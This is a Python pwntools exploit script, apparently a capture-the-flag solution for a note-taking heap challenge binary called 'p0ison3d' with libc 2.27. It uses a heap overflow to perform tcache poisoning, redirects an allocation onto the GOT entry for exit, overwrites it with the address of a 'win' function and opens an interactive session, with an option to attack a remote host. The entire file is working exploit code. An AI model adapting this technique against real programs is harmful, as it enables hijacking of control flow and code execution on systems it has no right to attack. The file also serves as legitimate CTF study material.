#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./p0ison3d"
libc = ELF("./libc-2.27.so")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        #b *del_note+111
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def add_note(index: int, buf):
    p.recvuntil("choice")
    p.sendline("1")
    p.recvuntil("index")
    p.sendline(str(index))
    p.recvuntil("data")
    p.sendline(buf)

def read_note(index: int):
    p.recvuntil("choice")
    p.sendline("2")
    p.recvuntil("index")
    p.sendline(str(index))
    p.recvuntil("data: ")
    return p.recvline().rstrip(b'\n');

def edit_note(index: int, buf):
    p.recvuntil("choice")
    p.sendline("3")
    p.recvuntil("index")
    p.sendline(str(index))
    p.recvuntil("data")
    p.sendline(buf)

def delete_note(index: int):
    p.recvuntil("choice")
    p.sendline("4")
    p.recvuntil("index")
    p.sendline(str(index))

add_note(0, p64(0xdeadbeefcafebabe))
add_note(1, p64(0xdeadbeefcafebabe))
add_note(2, p64(0xdeadbeefcafebabe))
delete_note(2)
delete_note(1)
# tcache poisoning with heap overflow
payload = b'A' * 0x80
payload += p64(0)
payload += p64(0x91)
payload += p64(elf.got['exit'])
edit_note(0, payload)
add_note(2, b'A' * 0x10)
add_note(1, p64(elf.symbols['win']))
p.recvuntil("choice")
p.sendline("5")

p.interactive()
